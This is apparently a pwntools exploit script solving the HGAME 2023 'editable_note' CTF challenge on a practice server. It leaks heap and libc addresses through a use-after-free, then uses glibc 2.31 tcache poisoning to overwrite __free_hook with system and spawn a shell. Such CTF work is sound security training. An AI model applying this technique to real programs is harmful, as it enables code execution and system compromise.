"""
[HGAME 2023 week2]editable_note exp

Date: 2026-08-30
Author: storm1614.top

glibc 2.31 UAF easy tcache poisoning
"""

from pwn import *

# io = process("./vuln")
io = remote("node5.anna.nssctf.cn", 24085)
libc = ELF("./libc-2.31.so")

context.log_level = "info"


def select(id: int):
    io.recvuntil(b">")
    io.sendline(str(id).encode())


def add(idx: int, size: int):
    select(1)
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Size: ")
    io.sendline(str(size).encode())
    print("add:", idx)


def delete(idx: int):
    select(2)
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())
    print("free:", idx)


def edit(idx: int, content: bytes):
    select(3)
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Content: ")
    io.sendline(content)
    print("edit:", idx)


def show(idx: int):
    select(4)
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())
    print("show:", idx)


for i in range(8):
    add(i, 0xFF)
add(8, 0x20)
for i in range(8):
    delete(i)
show(1)
heap = u64(io.recvuntil(b"\x55")[-6:].ljust(8, b"\x00"))
print("heap address =", hex(heap))
show(7)
libc_base = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - 0x1ECBE0
print("libc address =", hex(libc_base))
free_hook = libc_base + libc.sym["__free_hook"]
system = libc_base + libc.sym["system"]

## tcache poison
add(9, 0x20)
add(10, 0x20)

delete(8)
delete(9)  # 9->8

edit(10, b"/bin/sh\x00")  # top chunk
edit(9, p64(free_hook))  # 9->free_hook
add(11, 0x20)
add(12, 0x20)  # free_hook
edit(12, p64(system)) # free_hook -> system
delete(10) # system("/bin/sh") free->system
# gdb.attach(io)


io.interactive()
